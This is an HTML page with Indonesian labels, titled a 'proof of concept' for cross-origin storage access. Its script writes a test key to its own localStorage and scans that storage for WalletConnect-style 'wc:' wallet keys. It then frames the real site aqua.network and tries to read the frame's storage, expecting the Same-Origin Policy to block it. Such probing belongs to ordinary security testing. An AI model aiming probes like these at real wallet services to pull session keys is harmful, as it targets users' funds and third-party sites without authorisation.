<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Real Storage Isolation PoC</title>
    <style>
        body { font-family: monospace; background: #0f172a; color: #38bdf8; padding: 20px; }
        .container { background: #1e293b; padding: 20px; border-radius: 8px; border: 1px solid #334155; margin-bottom: 15px; }
        button { background: #0284c7; color: white; border: none; padding: 10px 15px; border-radius: 4px; cursor: pointer; font-weight: bold; margin: 5px 0; }
        button:hover { background: #0369a1; }
        #log { background: #020617; color: #4ade80; padding: 12px; border-radius: 4px; height: 200px; overflow-y: auto; white-space: pre-wrap; border: 1px solid #1e293b; }
        iframe { width: 100%; height: 120px; border: 1px dashed #64748b; background: #fff; margin-top: 10px; }
    </style>
</head>
<body>

    <div class="container">
        <h2>Skenario Nyata: Cross-Origin Storage Access PoC</h2>
        <p>Skrip ini mencoba membaca dan menulis data *storage* secara langsung lintas konteks/origin.</p>
        
        <button onclick="injeksikanDataNyata()">1. Tulis Payload ke LocalStorage</button>
        <button onclick="cobaAksesTargetNyata()">2. Ekstraksi Data & Cek Sesi (WalletConnect/App)</button>
        <button onclick="ujiIframeCrossDomain()">3. Muat Target via Iframe Cross-Origin</button>

        <div id="iframe-container"></div>
    </div>

    <div class="container">
        <h3>Live Execution Log:</h3>
        <div id="log">[INFO] PoC Real Environment Initialized. Ready.</div>
    </div>

    <script>
        function log(msg) {
            const logBox = document.getElementById('log');
            const time = new Date().toLocaleTimeString();
            logBox.innerText += `\n[${time}] ${msg}`;
            logBox.scrollTop = logBox.scrollHeight;
        }

        // 1. Menulis data nyata ke localStorage domain penyerang
        function injeksikanDataNyata() {
            try {
                const targetKey = 'wc:test-real-exploit';
                const payload = 'EXPLOIT_PAYLOAD_' + Math.random().toString(36).substring(7);
                localStorage.setItem(targetKey, payload);
                log(`[BERHASIL] Menulis kunci '${targetKey}' dengan nilai: ${payload}`);
            } catch (e) {
                log(`[GAGAL] Gagal menulis ke storage: ${e.message}`);
            }
        }

        // 2. Mengecek apakah storage domain lain/sesi sebelumnya bisa terbaca
        function cobaAksesTargetNyata() {
            log("[PROSES] Memindai seluruh kunci di dalam localStorage saat ini...");
            let foundKeys = 0;
            
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);
                // Biasanya kerentanan storage isolation membocorkan kunci wallet seperti awalan 'wc:'
                if (key.startsWith('wc:') || key.includes('test')) {
                    log(`[LEAK TERDETEKSI!] Key: ${key} | Value: ${value}`);
                    foundKeys++;
                }
            }

            if (foundKeys === 0) {
                log("[AMAN] Tidak ditemukan kebocoran kunci sensitif di konteks origin ini.");
            } else {
                log(`[KRITIS] Total ${foundKeys} kunci rentan berhasil diekstraksi!`);
            }
        }

        // 3. Menguji apakah iframe cross-origin dapat memicu celah akses bersama
        function ujiIframeCrossDomain() {
            log("[PROSES] Mencoba menyisipkan iframe target (aqua.network) untuk uji pembagian storage...");
            const container = document.getElementById('iframe-container');
            container.innerHTML = ''; // Reset
            
            const iframe = document.createElement('iframe');
            // Mencoba memuat target atau layanan terkait untuk melihat reaksi sandboxing browser
            iframe.src = 'https://aqua.network';
            
            iframe.onload = function() {
                log("[INFO] Iframe berhasil dimuat. Mencoba membaca DOM/Storage iframe lintas origin...");
                try {
                    // Berdasarkan SOP, baris ini seharusnya diblokir oleh browser (SecurityError)
                    const iframeStorage = iframe.contentWindow.localStorage;
                    log("[BAHAYA KRITIS!] Berhasil mengakses localStorage iframe cross-origin: " + iframeStorage);
                } catch (err) {
                    log("[TERISOLASI DENGAN BAIK] Akses storage iframe diblokir oleh Same-Origin Policy (SOP): " + err.name);
                }
            };
            
            iframe.onerror = function() {
                log("[INFO] Iframe diblokir oleh kebijakan keamanan target (X-Frame-Options / CSP).");
            };

            container.appendChild(iframe);
        }
    </script>

</body>
</html>
